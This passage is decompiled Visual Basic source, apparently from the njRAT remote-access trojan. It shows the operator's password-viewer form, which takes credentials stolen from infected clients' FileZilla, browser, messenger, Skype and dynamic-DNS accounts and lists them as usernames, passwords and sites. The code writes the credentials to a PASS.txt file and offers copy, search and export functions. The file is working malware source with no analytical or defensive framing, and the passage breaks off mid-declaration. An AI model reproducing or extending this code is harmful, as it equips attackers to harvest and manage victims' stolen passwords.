Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001B RID: 27
	<DesignerGenerated()>
	Public Partial Class Pass
		Inherits Form

		' Token: 0x06000434 RID: 1076 RVA: 0x00027430 File Offset: 0x00025630
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Pass.__ENCList
			SyncLock _ENCList
				If Pass.__ENCList.Count = Pass.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Pass.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Pass.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Pass.__ENCList(num) = Pass.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Pass.__ENCList.RemoveRange(num, Pass.__ENCList.Count - num)
					Pass.__ENCList.Capacity = Pass.__ENCList.Count
				End If
				Pass.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000186 RID: 390
		' (get) Token: 0x06000437 RID: 1079 RVA: 0x00028720 File Offset: 0x00026920
		' (set) Token: 0x06000438 RID: 1080 RVA: 0x00002C96 File Offset: 0x00000E96
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000187 RID: 391
		' (get) Token: 0x06000439 RID: 1081 RVA: 0x00028738 File Offset: 0x00026938
		' (set) Token: 0x0600043A RID: 1082 RVA: 0x00028750 File Offset: 0x00026950
		Friend Overridable Property CopyUseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyUseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyUseToolStripMenuItem_Click
				If Me._CopyUseToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyUseToolStripMenuItem.Click, value2
				End If
				Me._CopyUseToolStripMenuItem = value
				If Me._CopyUseToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyUseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000188 RID: 392
		' (get) Token: 0x0600043B RID: 1083 RVA: 0x000287A8 File Offset: 0x000269A8
		' (set) Token: 0x0600043C RID: 1084 RVA: 0x000287C0 File Offset: 0x000269C0
		Friend Overridable Property CopyPassToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyPassToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyPassToolStripMenuItem_Click
				If Me._CopyPassToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyPassToolStripMenuItem.Click, value2
				End If
				Me._CopyPassToolStripMenuItem = value
				If Me._CopyPassToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyPassToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000189 RID: 393
		' (get) Token: 0x0600043D RID: 1085 RVA: 0x00028818 File Offset: 0x00026A18
		' (set) Token: 0x0600043E RID: 1086 RVA: 0x00028830 File Offset: 0x00026A30
		Friend Overridable Property CopySiteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopySiteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopySiteToolStripMenuItem_Click
				If Me._CopySiteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopySiteToolStripMenuItem.Click, value2
				End If
				Me._CopySiteToolStripMenuItem = value
				If Me._CopySiteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopySiteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700018A RID: 394
		' (get) Token: 0x0600043F RID: 1087 RVA: 0x00028888 File Offset: 0x00026A88
		' (set) Token: 0x06000440 RID: 1088 RVA: 0x000288A0 File Offset: 0x00026AA0
		Friend Overridable Property CopyALLToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyALLToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyALLToolStripMenuItem_Click
				If Me._CopyALLToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyALLToolStripMenuItem.Click, value2
				End If
				Me._CopyALLToolStripMenuItem = value
				If Me._CopyALLToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyALLToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700018B RID: 395
		' (get) Token: 0x06000441 RID: 1089 RVA: 0x000288F8 File Offset: 0x00026AF8
		' (set) Token: 0x06000442 RID: 1090 RVA: 0x00002C9F File Offset: 0x00000E9F
		Friend Overridable Property SaveAllToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SaveAllToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._SaveAllToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x1700018C RID: 396
		' (get) Token: 0x06000443 RID: 1091 RVA: 0x00028910 File Offset: 0x00026B10
		' (set) Token: 0x06000444 RID: 1092 RVA: 0x00028928 File Offset: 0x00026B28
		Friend Overridable Property InClipboardToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._InClipboardToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InClipboardToolStripMenuItem_Click
				If Me._InClipboardToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._InClipboardToolStripMenuItem.Click, value2
				End If
				Me._InClipboardToolStripMenuItem = value
				If Me._InClipboardToolStripMenuItem IsNot Nothing Then
					AddHandler Me._InClipboardToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700018D RID: 397
		' (get) Token: 0x06000445 RID: 1093 RVA: 0x00028980 File Offset: 0x00026B80
		' (set) Token: 0x06000446 RID: 1094 RVA: 0x00028998 File Offset: 0x00026B98
		Friend Overridable Property InDiskToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._InDiskToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InDiskToolStripMenuItem_Click
				If Me._InDiskToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._InDiskToolStripMenuItem.Click, value2
				End If
				Me._InDiskToolStripMenuItem = value
				If Me._InDiskToolStripMenuItem IsNot Nothing Then
					AddHandler Me._InDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700018E RID: 398
		' (get) Token: 0x06000447 RID: 1095 RVA: 0x000289F0 File Offset: 0x00026BF0
		' (set) Token: 0x06000448 RID: 1096 RVA: 0x00028A08 File Offset: 0x00026C08
		Friend Overridable Property FindToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FindToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FindToolStripMenuItem_Click
				If Me._FindToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._FindToolStripMenuItem.Click, value2
				End If
				Me._FindToolStripMenuItem = value
				If Me._FindToolStripMenuItem IsNot Nothing Then
					AddHandler Me._FindToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700018F RID: 399
		' (get) Token: 0x06000449 RID: 1097 RVA: 0x00028A60 File Offset: 0x00026C60
		' (set) Token: 0x0600044A RID: 1098 RVA: 0x00028A78 File Offset: 0x00026C78
		Friend Overridable Property RemoveEmptyPWToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoveEmptyPWToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoveEmptyPWToolStripMenuItem_Click
				If Me._RemoveEmptyPWToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RemoveEmptyPWToolStripMenuItem.Click, value2
				End If
				Me._RemoveEmptyPWToolStripMenuItem = value
				If Me._RemoveEmptyPWToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RemoveEmptyPWToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000190 RID: 400
		' (get) Token: 0x0600044B RID: 1099 RVA: 0x00028AD0 File Offset: 0x00026CD0
		' (set) Token: 0x0600044C RID: 1100 RVA: 0x00002CA8 File Offset: 0x00000EA8
		Friend Overridable Property SaveFileDialog1 As SaveFileDialog
			<DebuggerNonUserCode()>
			Get
				Return Me._SaveFileDialog1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As SaveFileDialog)
				Me._SaveFileDialog1 = value
			End Set
		End Property

		' Token: 0x17000191 RID: 401
		' (get) Token: 0x0600044D RID: 1101 RVA: 0x00028AE8 File Offset: 0x00026CE8
		' (set) Token: 0x0600044E RID: 1102 RVA: 0x00002CB1 File Offset: 0x00000EB1
		Friend Overridable Property ImageList1 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._ImageList1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._ImageList1 = value
			End Set
		End Property

		' Token: 0x17000192 RID: 402
		' (get) Token: 0x0600044F RID: 1103 RVA: 0x00028B00 File Offset: 0x00026D00
		' (set) Token: 0x06000450 RID: 1104 RVA: 0x00002CBA File Offset: 0x00000EBA
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000193 RID: 403
		' (get) Token: 0x06000451 RID: 1105 RVA: 0x00028B18 File Offset: 0x00026D18
		' (set) Token: 0x06000452 RID: 1106 RVA: 0x00028B30 File Offset: 0x00026D30
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000194 RID: 404
		' (get) Token: 0x06000453 RID: 1107 RVA: 0x00028B88 File Offset: 0x00026D88
		' (set) Token: 0x06000454 RID: 1108 RVA: 0x00002CC3 File Offset: 0x00000EC3
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x17000195 RID: 405
		' (get) Token: 0x06000455 RID: 1109 RVA: 0x00028BA0 File Offset: 0x00026DA0
		' (set) Token: 0x06000456 RID: 1110 RVA: 0x00002CCC File Offset: 0x00000ECC
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x17000196 RID: 406
		' (get) Token: 0x06000457 RID: 1111 RVA: 0x00028BB8 File Offset: 0x00026DB8
		' (set) Token: 0x06000458 RID: 1112 RVA: 0x00002CD5 File Offset: 0x00000ED5
		Friend Overridable Property FlatMini2 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini2 = value
			End Set
		End Property

		' Token: 0x17000197 RID: 407
		' (get) Token: 0x06000459 RID: 1113 RVA: 0x00028BD0 File Offset: 0x00026DD0
		' (set) Token: 0x0600045A RID: 1114 RVA: 0x00028BE8 File Offset: 0x00026DE8
		Friend Overridable Property FlatButton4 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton4_Click
				If Me._FlatButton4 IsNot Nothing Then
					RemoveHandler Me._FlatButton4.Click, value2
				End If
				Me._FlatButton4 = value
				If Me._FlatButton4 IsNot Nothing Then
					AddHandler Me._FlatButton4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000198 RID: 408
		' (get) Token: 0x0600045B RID: 1115 RVA: 0x00028C40 File Offset: 0x00026E40
		' (set) Token: 0x0600045C RID: 1116 RVA: 0x00002CDE File Offset: 0x00000EDE
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x17000199 RID: 409
		' (get) Token: 0x0600045D RID: 1117 RVA: 0x00028C58 File Offset: 0x00026E58
		' (set) Token: 0x0600045E RID: 1118 RVA: 0x00028C70 File Offset: 0x00026E70
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019A RID: 410
		' (get) Token: 0x0600045F RID: 1119 RVA: 0x00028CC8 File Offset: 0x00026EC8
		' (set) Token: 0x06000460 RID: 1120 RVA: 0x00002CE7 File Offset: 0x00000EE7
		Friend Overridable Property FlatGroupBox1 As FlatGroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatGroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatGroupBox)
				Me._FlatGroupBox1 = value
			End Set
		End Property

		' Token: 0x1700019B RID: 411
		' (get) Token: 0x06000461 RID: 1121 RVA: 0x00028CE0 File Offset: 0x00026EE0
		' (set) Token: 0x06000462 RID: 1122 RVA: 0x00002CF0 File Offset: 0x00000EF0
		Friend Overridable Property L1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._L1 = value
			End Set
		End Property

		' Token: 0x1700019C RID: 412
		' (get) Token: 0x06000463 RID: 1123 RVA: 0x00028CF8 File Offset: 0x00026EF8
		' (set) Token: 0x06000464 RID: 1124 RVA: 0x00002CF9 File Offset: 0x00000EF9
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x1700019D RID: 413
		' (get) Token: 0x06000465 RID: 1125 RVA: 0x00028D10 File Offset: 0x00026F10
		' (set) Token: 0x06000466 RID: 1126 RVA: 0x00002D02 File Offset: 0x00000F02
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x1700019E RID: 414
		' (get) Token: 0x06000467 RID: 1127 RVA: 0x00028D28 File Offset: 0x00026F28
		' (set) Token: 0x06000468 RID: 1128 RVA: 0x00002D0B File Offset: 0x00000F0B
		Friend Overridable Property ColumnHeader3 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader3 = value
			End Set
		End Property

		' Token: 0x1700019F RID: 415
		' (get) Token: 0x06000469 RID: 1129 RVA: 0x00028D40 File Offset: 0x00026F40
		' (set) Token: 0x0600046A RID: 1130 RVA: 0x00002D14 File Offset: 0x00000F14
		Friend Overridable Property ColumnHeader4 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader4 = value
			End Set
		End Property

		' Token: 0x170001A0 RID: 416
		' (get) Token: 0x0600046B RID: 1131 RVA: 0x00028D58 File Offset: 0x00026F58
		' (set) Token: 0x0600046C RID: 1132 RVA: 0x00002D1D File Offset: 0x00000F1D
		Friend Overridable Property ColumnHeader5 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader5 = value
			End Set
		End Property

		' Token: 0x0600046D RID: 1133 RVA: 0x00002D26 File Offset: 0x00000F26
		Public Sub New()
			Pass.__ENCAddToList(Me)
			Me.bool_0 = True
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600046E RID: 1134 RVA: 0x00028D70 File Offset: 0x00026F70
		Public Sub FxCOLM(L1 As ListView)
			Dim num As Integer = L1.Columns.Count - 1
			For i As Integer = 0 To num
				L1.Columns(i).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
			Next
		End Sub

		' Token: 0x0600046F RID: 1135 RVA: 0x00028DB0 File Offset: 0x00026FB0
		Private Sub InClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.SV()
				If text.Length > 0 Then
					Clipboard.SetText(text)
					Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000470 RID: 1136 RVA: 0x00028E04 File Offset: 0x00027004
		Private Sub InDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.SaveFileDialog1.ShowDialog() = DialogResult.OK Then
					File.WriteAllText(Me.SaveFileDialog1.FileName, Me.SV())
					Interaction.MsgBox(Me.SaveFileDialog1.FileName, MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000471 RID: 1137 RVA: 0x00028E6C File Offset: 0x0002706C
		Private Sub FindToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Interaction.InputBox("Search", String.Empty, String.Empty, -1, -1)
				If Operators.CompareString(text, String.Empty, False) <> 0 Then
					Dim pass As Pass = New Pass() With { .Name = "e", .Text = "Search For '" + text + "'" }
					pass.Show()
					Try
						For Each obj As Object In Me.L1.Items
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim num As Integer = 0
							Do
								If Strings.InStr(listViewItem.SubItems(num).Text.ToLower(), text.ToLower(), CompareMethod.Binary) > 0 Then
									Dim listViewItem2 As ListViewItem = pass.L1.Items.Add(listViewItem.Text, listViewItem.ImageIndex)
									Dim num2 As Integer = listViewItem.SubItems.Count - 1
									For i As Integer = 1 To num2
										listViewItem2.SubItems.Add(listViewItem.SubItems(i).Text)
									Next
								Else
									num += 1
								End If
							Loop While num <= 2
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					pass.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count))
					Me.FxCOLM(pass.L1)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000472 RID: 1138 RVA: 0x00029050 File Offset: 0x00027250
		Private Sub CopyUseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L1.SelectedItems(0).Text.Length > 0 Then
					Clipboard.SetText(Me.L1.SelectedItems(0).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000473 RID: 1139 RVA: 0x000290BC File Offset: 0x000272BC
		Private Sub CopyPassToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L1.SelectedItems(0).SubItems(1).Text.Length > 0 Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(1).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000474 RID: 1140 RVA: 0x0002913C File Offset: 0x0002733C
		Private Sub CopyALLToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.L1.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.SubItems(0).Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				If text.Length > 0 Then
					Clipboard.SetText(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000475 RID: 1141 RVA: 0x0002924C File Offset: 0x0002744C
		Private Sub RemoveEmptyPWToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.SubItems(1).Text, String.Empty, False) = 0 Then
						listViewItem.Remove()
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x06000476 RID: 1142 RVA: 0x00029300 File Offset: 0x00027500
		Public Function SV() As String
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Return text
		End Function

		' Token: 0x06000477 RID: 1143 RVA: 0x000293D8 File Offset: 0x000275D8
		Public Sub XD(ByRef c As Client, ByRef S As String)
			Dim array As String() = Strings.Split(S, " ", -1, CompareMethod.Binary)
			Dim num As Integer = -1
			If Not Directory.Exists(c.Folder) Then
				Directory.CreateDirectory(c.Folder)
			End If
			Dim array2 As String() = New String() { "FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer", "ooVoo", "DUC v3", "Skype" }
			Dim text As String = String.Empty
			For Each text2 As String In array
				Try
					If text2.Length > 0 Then
						If Operators.CompareString(text2, "*", False) = 0 Then
							num += 1
						Else
							If Not text2.Contains(":") Then
								text2 = Class6.smethod_16(text2)
							End If
							Dim array4 As String() = Strings.Split(text2, ":", -1, CompareMethod.Binary)
							If array4.Length > 3 Then
								Dim expression As String = text2
								Dim find As String = array4(0) + ":" + array4(1)
								Dim text3 As String = array4(0) + ":" + array4(1)
								array4 = Strings.Split(Strings.Replace(expression, find, Class6.smethod_14(text3), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary)
							End If
							Dim listViewItem As ListViewItem = New ListViewItem()
							listViewItem = Me.L1.Items.Add(Class6.smethod_16(array4(1)), num)
							listViewItem.SubItems.Add(Class6.smethod_16(array4(2)))
							listViewItem.SubItems.Add(Class6.smethod_16(array4(0)))
							listViewItem.SubItems.Add(array2(num))
							NewLateBinding.LateCall(listViewItem.SubItems, Nothing, "Add", New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(c.L)))) }, Nothing, Nothing, Nothing, True)
							text = text + "USR: " + listViewItem.Text + vbCrLf
							text = text + "PWD: " + listViewItem.SubItems(1).Text + vbCrLf
							text = text + "URL: " + listViewItem.SubItems(2).Text + vbCrLf & vbCrLf
						End If
					End If
				Catch ex As Exception
				End Try
			Next
			Try
				File.WriteAllText(c.Folder + "PASS.txt", text)
			Catch ex2 As Exception
			End Try
			Me.FxCOLM(Me.L1)
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x06000478 RID: 1144 RVA: 0x00029704 File Offset: 0x00027904
		Private Sub L1_DoubleClick(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.L1.SelectedItems(0).SubItems(2).Text
				If Not text.Contains("://") Then
					text = "http://" + text
				End If
				Process.Start(text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000479 RID: 1145 RVA: 0x00002D41 File Offset: 0x00000F41
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.bool_0 = True
			Me.L1.BringToFront()
		End Sub

		' Token: 0x0600047A RID: 1146 RVA: 0x00029778 File Offset: 0x00027978
		Private Sub CopySiteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L1.SelectedItems(0).SubItems(2).Text.Length > 0 Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(2).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600047B RID: 1147 RVA: 0x00002D41 File Offset: 0x00000F41
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.bool_0 = True
			Me.L1.BringToFront()
		End Sub

		' Token: 0x0600047C RID: 1148 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton4_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x040001F0 RID: 496
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001F2 RID: 498
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x040001F3 RID: 499
		<AccessedThroughProperty("CopyUseToolStripMenuItem")>
		Private _CopyUseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001F4 RID: 500
		<AccessedThroughProperty("CopyPassToolStripMenuItem")>
		Private _CopyPassToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001F5 RID: 501
		<AccessedThroughProperty("CopySiteToolStripMenuItem")>
		Private _CopySiteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001F6 RID: 502
		<AccessedThroughProperty("CopyALLToolStripMenuItem")>
		Private _CopyALLToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001F7 RID: 503
		<AccessedThroughProperty("SaveAllToolStripMenuItem")>
		Private _SaveAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001F8 RID: 504
		<AccessedThroughProperty("InClipboardToolStripMenuItem")>
		Private _InClipboardToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001F9 RID: 505
		<AccessedThroughProperty("InDiskToolStripMenuItem")>
		Private _InDiskToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001FA RID: 506
